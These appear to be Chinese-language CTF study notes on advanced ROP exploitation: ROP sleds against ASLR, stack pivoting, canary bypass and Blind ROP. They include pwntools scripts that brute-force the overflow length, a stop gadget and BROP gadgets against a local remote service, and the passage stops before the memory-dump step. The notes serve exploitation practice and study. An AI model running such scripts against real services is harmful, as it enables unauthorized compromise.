# 花式ROP









## ROP滑梯绕过ASLR

ROP滑梯可以绕过`ASLR`

![image-20241123131806602](../_media/image-20241123131806602.png)





## 栈迁移



LEAVE

```
在函数返回时，恢复父函数栈帧的指令
```

就是将ebp和esp拉到相同的位置

- MOV esp ebp
- pop ebp
- 此时ebp在若是恶意地址，那就实现栈迁移





本质：rbp/rsp 迁移到其他地方的一种手段

使用指令：leave，pop rbpv

实际做法就是在缓冲区写危险函数，然后最后控制范围函数到`leave ret`



栈迁移传统思路：

- 找机会去泄露栈空间的地址然后把栈迁移到我们可以控制的栈空间，或者迁移到堆空间，大致思路就是覆盖rbp为我们想要迁移到的地方，然后在溢出的位置上填上leave ret



- rbp位置上填写bss段可写地址，然后在返回地址填上主函数自己的read，这样就可以把栈迁移到bss段了

特点，溢出0x8，第一时间要想到栈迁移



要实现栈迁移，需要至少执行两次写入操作

一次用于向可读写内存区（比如.bss段）写入rop链

第二次用于触发栈溢出，将esp寄存器指向上一步写入的rop链所在的内存区

同时还需要执行两次leave ret操作

一次用于触发栈溢出修改后的函数ret地址

一次用于将ebp esp寄存器指向rop链的内存区完成迁移动作
















## Canary绕过

低版本libc，直接利用库函数缺陷溢出，将指针替换为需要泄露出的字符串地址，主动触发检测，打印`flag`



子进程爆破Canary值，有fork的话



两种思路：

- 将Canaries的值泄露出来，然后栈溢出的时候精准覆盖
- 同时篡改TLS和栈上的Canaries，绕过检查

 







## 盲打

就是没有给出文件给你，只给了远程服务器给你

必要条件：

1. 目标程序存在一个栈溢出漏洞，并且我们知道怎样去触发它
2. 目标进程在崩溃后会立即重启，并且重启后进程被加载的地址不变，这样即使目标机器开启了 ASLR 也没有影响。



- 枚举，判断栈溢出长度
- 爆破，按照字节爆破进行，32位情况下，至多爆破1024次，64位至多2048次，找到canary的值



盲ROP

Blind ROP

- 使用 libc_csu_init 结尾的一段 gadgets 来实现，同时可以使用 plt 来获取write地址
- 在write的参数里面，rdx是用来限制输出长度的，一般不会为0
- 可以通过 strcmp 来实现，在执行 strcmp 的时候，rdx会被设置为字符串的长度，所以只要找到 strcmp 就可以实现控制rdx



找gadget

- 执行代码的时候陷入循环，就是出题人向你透露这一段gadget
- 构造payload识别正在执行的指令的效果



步骤：

- 找出栈溢出长度
- 找到一个让程序不崩溃的地址
- 找出BROP_gadgets
- 打印出put@plt的地址
- 然后多次put，把程序dump下来
- ida分析
- 再`libcsearch` 去 `ret2libc`



做题步骤：



崩溃意味着找到了覆盖返回地址

```python
def get_buffer_size():
    for i in range(100):
        payload = "A"
        payload += "A"*i
        buf_size = len(payload) - 1
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.send(payload)
            p.recv()
            p.close()
            log.info("bad: %d" % buf_size)
        except EOFError as e:
            p.close()
            log.info("buffer size: %d" % buf_size)
            return buf_size
```



找到覆盖返回地址的长度之后，就要寻找通用gadget了，因为只知道缓冲区溢出长度也是不行的，因为覆盖的地址大概率不是而合法的，需要找到一个能够使程序正常返回的地址，称为stop gadget

```python
def get_stop_addr(buf_size):
    addr = 0x400000
    while True:
        sleep(0.1)
        addr += 1
        payload = "A"*buf_size
        payload += p64(addr)
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.sendline(payload)
            p.recvline()
            p.close()
            log.info("stop address: 0x%x" % addr)
            return addr
        except EOFError as e:
            p.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1
```



找到一个就可以了，一般是从`0x400000` 开始找，找到了之后程序还是一样崩溃，但是那些正常返回的地址会通过stop gadget进入被挂起的状态，在这个基础上寻找其他可利用的gadget。一般开始搜索的地址从上面获取的stop gadget地址开始搜索就可以了。

```python
def get_gadgets_addr(buf_size, stop_addr):
    addr = stop_addr
    while True:
        sleep(0.1)
        addr += 1
        payload = "A"*buf_size
        payload += p64(addr)
        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
        payload += p64(stop_addr)
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.sendline(payload)
            p.recvline()
            p.close()
            log.info("find address: 0x%x" % addr)
            try: # check
                payload = "A"*buf_size
                payload += p64(addr)
                payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
                p = remote('127.0.0.1', 10001)
                p.recvline()
                p.sendline(payload)
                p.recvline()
                p.close()
                log.info("bad address: 0x%x" % addr)
            except:
                p.close()
                log.info("gadget address: 0x%x" % addr)
                return addr
        except EOFError as e:
            p.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1
```



得到通用gadget，就可以得到`pop rdi;ret` 的地址了，就是 `gadget address + 9`

然后就是使用puts函数来dump内存，仅仅需要一个参数

